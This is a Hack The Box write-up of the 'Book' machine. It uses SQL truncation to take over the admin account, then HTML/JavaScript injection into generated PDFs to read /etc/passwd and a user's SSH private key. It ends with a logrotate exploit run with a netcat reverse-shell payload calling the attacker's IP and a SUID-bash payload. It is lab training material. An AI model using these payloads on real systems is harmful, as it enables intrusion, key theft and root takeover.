---
layout: post
title:  "Book Writeup - Hack The Box"
date:   2025-08-25
desc: ""
keywords: "HTB,OSCP,OSWE,eWPT,Linux,SQL Truncation,Local File Read,PDF,Cron Job Abuse,Logrotate Exploit,Medium"
categories: [HTB]
tags: [HTB,OSCP,OSWE,eWPT,Linux,SQL Truncation,Local File Read,PDF,Cron Job Abuse,Logrotate Exploit,Medium]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/book_writeup/Book.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

I start a new **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** lab to continue my practice and improve my skills in the field of **Information Security**. The **Book** box was rated as **Medium** because the vulnerabilities are not very complex but they represent a lot of work to find them and I had to do a lot of tests and make a lot of mistakes to advance step by step to engage the machine. I love practicing with the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform because I face environments that push my knowledge to the limits and as I'm just starting in this field make me advance very quickly in my profession. I sign-in to my account to spawn the box and start the writeup.

<br /><br />
<img src="{{ site.img_path }}/book_writeup/Book_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

As in each machine I start I check with `ping` that I already have connectivity with it by sending a trace, also with the **[hack4u](https://hack4u.io/){:target="_blank"}** tool, `whichSystem.py`, I can check that the operating system of the machine is **Linux** taking advantage of the **TTL** value, although this value can be manipulated to leak erroneous information from the system as a protection measure. With all the previous steps completed I concentrate because I'm going to start a crucial phase in a **Pentest** or **lab**, the **Reconnaissance**, and I start listing the open ports with `nmap`. This excellent tool also has custom scripts that help me to leak information of the services and their versions, accessible on each open port, with all the information collected I can get the **codename** of the machine (irrelevant data for the moment). As only the **SSH** protocol (very secure in most labs) and **HTTP** are accessible, I will focus my efforts on the latter, which also represents the largest attack surface, to use `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** to disclose the technology stack behind the web application.

```bash
ping -c 1 10.10.10.176
whichSystem.py 10.10.10.176
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.176 -oG allPorts
nmap -sCV -p22,80 10.10.10.176 -oN targeted
cat targeted
#     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
#     Apache httpd 2.4.29

whatweb http://10.10.10.176
# http://10.10.10.176/
```

<br />
<img src="{{ site.img_path }}/book_writeup/Book_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Since the web application allows me to create a new account to access the **Dashboard**, I avoid using bypass techniques in the authentication panel for the time being. Once I sign-in with the newly created user, I notice that the name I chose is displayed on the screen and it gives me some ideas to inject **malicious tags** or even use more sophisticated techniques to attack the web server. There is an image available that I try to analyze with `steghide` in search of hidden content but I find nothing following this attack vector, if I access the **Profile** tab of my account I find the field where I could inject malicious content. The **Settings** panel, which usually leaks sensitive web server information, is not available because it is currently under development.

```bash
# http://10.10.10.176/
# http://10.10.10.176/home.php

mv /home/al3j0/Downloads/1.jpg .
file 1.jpg
exiftool 1.jpg
steghide info 1.jpg
```

<br/>
<img src="{{ site.img_path }}/book_writeup/Book_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

In one of the tabs (**Books**) I find a table of resources that can be accessed using the **GET** method, which takes advantage of the **URL** to specify which resource should be loaded in the browser through the **file** parameter. The shared resources are **PDF files**, I also find in the same tab the implementation of a **Books Search**, in which I perform some **[SQLi](https://portswigger.net/web-security/sql-injection){:target="_blank"}** tests that do not work. I can also send a feedback to the **Administrator**, which may be a hint that a user action may be being simulated through a scheduled task (**this is a guess of mine**), which makes me think of a session cookie theft through an **[XSS](https://portswigger.net/web-security/cross-site-scripting){:target="_blank"}** but I don't succeed in my test. I upload a test image to check if the functionality is implemented as well as the type of files I could upload and I have no problems. In the **Contact Us** tab I try again an **[XSS](https://portswigger.net/web-security/cross-site-scripting){:target="_blank"}** and again I fail the test, but I notice two important data that I had overlooked, the username (**admin**) and the domain.

```bash
# http://10.10.10.176/books.php
# http://10.10.10.176/search.php
# Queen'
# Queen' or sleep(5)-- -        :(

python3 -m http.server 80
# http://10.10.10.176/feedback.php
# <script src="http://10.10.14.10"></script>      :(

# http://10.10.10.176/collections.php
# Book Submission

# http://10.10.10.176/contact.php
# <script src="http://10.10.10.176/oldboy"></script>
```

<br />
<img src="{{ site.img_path }}/book_writeup/Book_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I will return to the **Books** tab and try various attack vectors such as **[IDOR](https://portswigger.net/web-security/access-control/idor){:target="_blank"}**, **[Directory Traversal](https://portswigger.net/web-security/file-path-traversal){:target="_blank"}** or **[SQLi](https://portswigger.net/web-security/sql-injection){:target="_blank"}**. In order not to waste too much time from the console or from my browser, I have the excellent **BurpSuite** tool to act as a proxy, so I can modify the requests to my taste and speed up the attacks. I use the **Repeater** feature and try basic **[SQLi](https://portswigger.net/web-security/sql-injection){:target="_blank"}** or **[Directory Traversal](https://portswigger.net/web-security/file-path-traversal){:target="_blank"}** attacks, but I don't observe any strange behavior in the server response, even if I delete the session cookie I only get a redirection but without vulnerating the web service.

```bash
# http://10.10.10.176/collections.php
# http://10.10.10.176/contact.php
# <script src="http://10.10.10.176/oldboy"></script>        :(

burpsuite &>/dev/null & disown
# GET /download.php?file=1'
# GET /download.php?file=1' or sleep(5)-- -
# GET /download.php?file=1' and sleep(5)#

# GET /download.php?file=../../../../../../../../etc/passwd
# GET /download.php?file=....//....//....//....//....//....//....//....//etc/passwd
```

<br />
<img src="{{ site.img_path }}/book_writeup/Book_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Another attack vector I try is to bypass the authentication panel using **[SQLi](https://portswigger.net/web-security/sql-injection){:target="_blank"}** with **BurpSuite**. This time the **POST** method is used to send the data, so I perform my first injections in all the fields but I don't succeed either and also the error responses are always the same, even the length of them is constant so I'm not getting the behavior of the web server to be compromised.

```bash
burpsuite &>/dev/null & disown
# email=oldboy%40book.htb'&password=oldboy123
# email=oldboy%40book.htb' or 1=1-- -&password=oldboy123
# email=oldboy%40book.htb' and sleep(5)-- -&password=oldboy123
# email=oldboy%40book.htb' and sleep(5)#&password=oldboy123
```

<br />
<img src="{{ site.img_path }}/book_writeup/Book_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Something I had forgotten is to add the **domain name** that had been leaked to my **hosts** file, many times when I use the domain name and not the **IP**, the server response is different as it is iplementing **Virtual Hosting**. With `wfuzz` I start a files and web derectorios discovery with promising results that allow me to access a new authentication panel for administrators, plus one that most likely hosts web application documents (in which **I don't have read permissions**). As **PHP** is being used as programming language, I search for hidden **.php** files but except for one that may be related to the **Database**, whose content obviously I can't see because it is interpreted by the server, I can't find much more information at the moment.

```bash
nvim /etc/hosts
cat /etc/hosts | tail -n 1
ping -c 1 book.htb

wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.176/FUZZ

# http://10.10.10.176/docs/
# http://10.10.10.176/admin/

wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.176/FUZZ.php
# view-source:http://10.10.10.176/db.php
```

<br />
<img src="{{ site.img_path }}/book_writeup/Book_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

It is at this point that frustration should not cloud my actions, because I have not yet found or understood what is the attack vector, in the authentication panel I can perform an user enumeration account and try to perform a **[Type Juggling](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html?highlight=Type%20Jugg#loose-comparisonstype-juggling---){:target="_blank"}** attack using **BurpSuite**. Also the web server is not vulnerable so I still don't understand how I can engage the machine.

> **[Type Juggling](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html?highlight=Type%20Jugg#loose-comparisonstype-juggling---){:target="_blank"}**: If **"=="** is used in **PHP**, then there are unexpected cases where the comparison doesn't behave as expected. This is because **"=="** only compare values transformed to the same type, if you also want to compare that the type of the compared data is the same you need to use **"==="**.

```bash
# http://10.10.10.176/index.php
# admin@book.htb

burpsuite &>/dev/null & disown
# http://10.10.10.176/admin/index.php
# email=admin%40book.htb[]&password[]=admin
```

<br />
<img src="{{ site.img_path }}/book_writeup/Book_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm out of ideas, so I resort to a vulnerability that can be exploited in Database by a bad **PHP** programming which is the  **[SQL Truncation](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html?highlight=SQL%20Truncation#modify-password-of-existing-objectuser){:target="_blank"}** that can allow me to change the **admin** account password. Once again I resort to **BurpSuite's Repeater** feature to perform my tests, just in case I delete the session cookie and start the tests first using the name field and leaving a blank space in the username (**URL encoded** of course) but the error message (**User exists**) makes me understand that the attack did not work. After several tests with the first field, I switch to the next one (**email**) and with several blanks used I get the status code to change from **200** to **302**, a sign that maybe I could reach my goal but if I try to log in the server does not allow it.

> **[SQL Truncation Attack](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html?highlight=SQL%20Truncation#modify-password-of-existing-objectuser){:target="_blank"}**: If the database is vulnerable and the max number of chars for username is for example 30 and you want to impersonate the user **admin**, try to create a username called: **"admin [30 spaces] a"** and any password. The database will check if the introduced username exists inside the database. **If not**, it will cut the username to the max allowed number of characters (in this case to: **"admin [25 spaces]"**) and the it will automatically remove all the spaces at the end updating inside the database the user **"admin"** with the new password (some error could appear but it doesn't means that this hasn't worked).

```bash
# http://10.10.10.176/index.php
# admin   admin@book.htb  admin123

burpsuite &>/dev/null & disown
# name=admin+.&email=admin%40book.htb&password=admin123
# ....
# name=admin++++++++++++++++++.&email=admin%40book.htb&password=admin123

# name=admin&email=admin%40book.htb+.&password=admin123
# ...
# name=admin&email=admin%40book.htb++++++.&password=admin123
# http://10.10.10.176/admin/
```

<br />
<img src="{{ site.img_path }}/book_writeup/Book_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/book_writeup/Book_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to put my mentality in **Try Harder** mode and retry the attack, I must have made some mistake. I start my tests again from the beginning using the **email** field, inserting one blank space at a time, but I also find in the body of the response some **clues** about the **maximum allowed length** of the values of the **name** and **email** fields. Finally I achieve my goal of updating the **admin** user password and this way I can now access the **Admin Panel**.

```html
# name=admin&email=admin@book.htb+++++++.&password=admin123
# http://10.10.10.176/admin/
```

<br />
<img src="{{ site.img_path }}/book_writeup/Book_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Once I accessed the **Admin Panel**, my web application enumeration phase begins but now with the new privileges account. I can access what is most likely the list of registered users, plus in the **Collections** tab there are **PDF** files with the list of users and books uploaded to the web server. Now if I upload a test PDF file, but from the account I had previously created, I can see that I do have the ability to do this so I can come up with some ideas to engage the web server.

```bash
# http://10.10.10.176/admin/home.php
# http://10.10.10.176/admin/users.php
# http://10.10.10.176/admin/collections.php
# file:///tmp/mozilla_al3j00/25955.pdf

touch test.pdf
# http://10.10.10.176/collections.php

# http://10.10.10.176/search.php
# http://10.10.10.176/download.php?file=55442
```

<br />
<img src="{{ site.img_path }}/book_writeup/Book_53.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_54.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_55.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/book_writeup/Book_56.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_57.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

My idea is to upload a **malicious PDF** file on the server, the contents of which will allow me to leak sensitive system files or even an **RCE**, as I had tried it in previous labs with good results. I just have to research on the **Internet** for a reasonable time to find **Hassan Khan Yusufzai's** research, **[SSRF to Local File Read](https://hassankhanyusufzai.com/blogs/ssrf-lfi){:target="_blank"}**, which I can test on this machine. The first thing I do is to create the **PDF** file with the **HTML injection** and then upload it through the created account, but when I access it on the web server I don't see that the injection has been interpreted. I try again, but adjusting a little the injection and eliminating the first double quotation mark (**"**) but I still do not get good results.

> Vulnerability in **Wkhtmltopdf gem**, which was allowing users to inject **HTML** in the **pdf files**, and after further research, It was able to identify that the parser's functionality was vulnerable to internal **SSRF** attack, which further allowed to read server's local file. Inject simple **HTML payload** in the code section of the application **"><h1>XSS</h1>**. Loading the **PDF file** show's the injected **HTML** has been successfully executed in the **PDF file**.

```bash
nvim pwn3d.pdf
cat !$
```

> **pwn3d.pdf**:

```javascript
"><script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///etc/passwd");
x.send();
</script>
```

```bash
# http://10.10.10.176/collections.php
# http://10.10.10.176/search.php
# file:///tmp/mozilla_al3j00/62312.pdf

nvim pwn3d.pdf
```

> **pwn3d.pdf**:

```javascript
> <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

```html
# http://10.10.10.176/search.php
# file:///tmp/mozilla_al3j00/59343.pdf
```

<br />
<img src="{{ site.img_path }}/book_writeup/Book_58.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_59.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_60.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/book_writeup/Book_61.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_62.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I know **I'm doing something wrong** because I'm not taking advantage of having changed the **admin** user password, so I correct my attack vector and upload the malicious **PDF** file again, but now from the **admin** account I access the **PDF** file from the list of books uploaded to the server to corroborate that I have access to it. The next thing is to upload a **[test file](https://file-examples.com/index.php/sample-documents-download/sample-pdf-download/){:target="_blank"}** to validate that the functionality is interpreting the content correctly, also I realize now that I have control of two values, the name of the book and the author, which are reflected in the **PDF** file of the list of books. So I understand that most probably the vulnerability is here and not in the content of the file that I can upload.

```bash
# http://10.10.10.176/collections.php
# http://10.10.10.176/admin/collections.php

# http://10.10.10.176/collections.php
# http://10.10.10.176/search.php

# http://10.10.10.176/admin/collections.php
# file:///tmp/mozilla_al3j00/51123.pdf
```

<br />
<img src="{{ site.img_path }}/book_writeup/Book_63.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_64.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_65.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/book_writeup/Book_66.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_67.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_68.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Then I modify the **technique** o the **target** but not the attack vector, this time I perform the **HTML injection** directly in the fields that I have control, first in the **author** field but it seems that there is some kind of sanitization because the injection is not interpreted. The next test is using the **title** field of the book but I also use the **JavaScript** function **btoa** so that the content of the **[sensitive file is leaked in Base64](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.html?highlight=xss%20read%20local%20file#read-local-file--ssrf){:target="_blank"}** encoding (in case there is any protection measure) and this time I achieve my goal. With `base64` I can decode the content of the file, and if I perform a test but without using **Base64** encoding I can also access the content.

```bash
# http://10.10.10.176/collections.php
# Author = <script> x=new XMLHttpRequest; x.onload=function(){document.write(btoa(this.responseText))}; x.open("GET","file:///etc/passwd");x.send(); </script>
# http://10.10.10.176/admin/collections.php

# http://10.10.10.176/collections.php
# http://10.10.10.176/admin/collections.php
# file:///tmp/mozilla_al3j00/7999.pdf
# :)

echo cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxO | base64 -d; echo

# http://10.10.10.176/collections.php
# http://10.10.10.176/admin/collections.php
# file:///tmp/mozilla_al3j00/59339.pdf
```

<br />
<img src="{{ site.img_path }}/book_writeup/Book_69.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_70.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/book_writeup/Book_71.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_72.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_73.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_74.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The user file of the system I find that the user **reader** has a **bash** shell assigned, so I'm going to leak if his **id_rsa** key exists to be able to connect using the **SSH** protocol. In the first attempt I succeed with the injection but I don't observe the content correctly so I must use the **<pre>** tag to adjust it in a new injection. Now that I was able to access the user's private key, I save it on my attacking machine and give it the correct permissions (**400** or **600**) to prevent the `ssh` program from throwing an error indicating that the access permissions are too open. I manage to access the machine and start the enumeration phase where I corroborate that the **codename** is **bionic** and also access the first flag.

```bash
# http://10.10.10.176/collections.php
# <script> x=new XMLHttpRequest; x.onload=function(){document.write(this.responseText)}; x.open("GET","file:///home/reader/.ssh/id_rsa");x.send(); </script>
# http://10.10.10.176/admin/collections.php
# file:///tmp/mozilla_al3j00/64041.pdf

# <script>x=new XMLHttpRequest;x.onload=function(){document.write("<pre>" + this.responseText + "</pre>")};x.open("GET","file:///etc/passwd");x.send();</script>
# file:///tmp/mozilla_al3j00/74137.pdf

nvim id_rsa
chmod 600 id_rsa
ssh -i id_rsa reader@10.10.10.176

export TERM=xterm
whoami
hostname
hostname -I
uname -a
lsb_release -a
```

<br />
<img src="{{ site.img_path }}/book_writeup/Book_75.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_76.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/book_writeup/Book_77.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_78.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/book_writeup/Book_79.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_80.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

In the personal directory of the **reader** user I find a very suspicious folder (**backups**) with two log files, which may be an indication that there is a **Cron job** running in the background, so I create a custom script to monitor the system tasks and just waiting a while I find that the **[`logrotate` tool](https://www.baeldung.com/linux/rotating-logs-logrotate){:target="_blank"}** is enabled to manage the system by generating the logs. I search with `searchsploit` for some vulnerability for the **Linux kernel** version of the victim machine, but the list of exploits I find are only for older versions so they are not going to help me to **Escalate privileges**. But if I search for exploits for the `logrotate` version, there are some exploits for the same.

> **`logrotate`** is designed to ease administration of systems that generate large numbers of log files. It allows automatic **rotation**, **compression**, **removal**, and **mailing** of **log files**. Each log file may be handled daily, weekly, monthly, or when it grows too large. Normally, `logrotate` is run as a **daily cron job**.

> **[Rotating Logs With Logrotate in Linux](https://www.baeldung.com/linux/rotating-logs-logrotate){:target="_blank"}**: In **Linux**, applications and background processes are constantly generating logs. It’s important to keep these logs in check by trimming them on a specific schedule. However, manually doing that is labor-intensive. To reduce the manual intervention, we can automate the process using `logrotate`.

> **Victime Machine**:

```bash
ls -la
cd backups/
cat access.log.1
# 192.168.0.104 - - [29/Jun/2019:14:39:55 +0000] "GET /robbie03 HTTP/1.1" 404 446 "-" "curl"
ps -fawx
cd /dev/shm
touch procmon.sh
nano !$
cat !$
```

> **procmon.sh**:

```bash
#!/bin/bash

old_process=$(ps -eo user,command)

while true; do
	new_process=$(ps -eo user,command)
	diff <(echo "$old_process") <(echo "$new_process") | grep '[\<\>]' | grep -vE 'command|procmon|kworker'
	old_process=$new_process
done
```

```bash
chmod +x procmon.sh
./!$
# > root     /bin/sh /root/log.sh
# > root     /usr/sbin/logrotate -f /root/log.cfg
```

> **Attacker Machine**:

```bash
searchsploit logrotate
```

> **Victime Machine**:

```bash
uname -a
# Linux book 5.4.1    :(

logrotate --version
# logrotate 3.11.0    :)
```

> **Attacker Machine**:

```bash
searchsploit logrot
```

<br />
<img src="{{ site.img_path }}/book_writeup/Book_81.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_82.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/book_writeup/Book_83.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_84.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/book_writeup/Book_85.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to download the **exploit** (than exploiting a **Race Condition**) on my machine to try to **Escalate privileges**, it happens to be written in **C** language and I have to compile it to run it on the victim machine. If I inspect the code before performing the attack I'm asked that there are certain conditions for exploitation, first that `logrotate` is running as **root**, also that it has control of the **logs directory** and can also **generate log files**, I think all the requirements are satisfied. Before continuing I investigate in **Internet** to evacuate some doubts that I have, I find two publications that give me all the necessary information to **[exploit logrotate](https://intrusionz3r0.gitbook.io/intrusionz3r0/linux-penetration-testing/privilege-escalation/exploit-logrotate){:target="_blank"}** and **[escalate privileges with logrotate](https://packetstorm.news/files/154743/Logrotate-3.15.1-Privilege-Escalation.html){:target="_blank"}**. I check that `gcc` is available on the victim machine, transfer the source code and compile it to successfully test its execution. The next step is to create a **payload** that needs the exploit with the malicious commands that in my first attack will send me a **Reverse Shell** using a **[PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"}** oneliner, but I can't establish the connection following all the necessary steps. I look for another way to **Escalate privileges** which is to use a command to enable the **SUID** bit of the `bash` shell and this way if I get the changes to be made. Now I just have to migrate to a `bash` shell using the **-p** parameter to run in privileged mode and I manage to finish engaging the box and access the last flag.

> **Attacker Machine**:

```bash
 searchsploit -x linux/local/47466.c
```

> **Victime Machine**:

```bash
/dev/shm/procmon.sh | grep logrotate
ls -la /home/reader/backups
```

> **Attacker Machine**:

```bash
searchsploit -m linux/local/47466.c
mv 47466.c exploit.c
nvim exploit.c
python3 -m http.server 80
```

> **Victime Machine**:

```bash
which gcc
wget http://10.10.14.10/exploit.c
gcc -o exploit exploit.c
chmod +x exploit
./exploit
# -p  --payloadfile <file>   File that contains the payload

echo '#!/bin/bash' > payload
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 443 >/tmp/f' >> payload
cat !$
```

> **payload**:

```bash
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 443 >/tmp/f
```

```bash
./exploit -p ./payload /home/reader/backups/access.log
```

> **Attacker Machine**:

```bash
nc -nlvp 443

ssh -i id_rsa reader@10.10.10.176
```

> **Victime Machine**:

```bash
cd ~/backups
echo 'oldboy was here' >> access.log

echo '#!/bin/bash' > payload
echo 'chmod u+s /bin/bash' >> payload
cat !$
```

> **payload**:

```bash
#!/bin/bash
chmod u+s /bin/bash
```

```bash
./exploit -p ./payload /home/reader/backups/access.log

echo 'oldboy was here' > access.log

ls -l /bin/bash
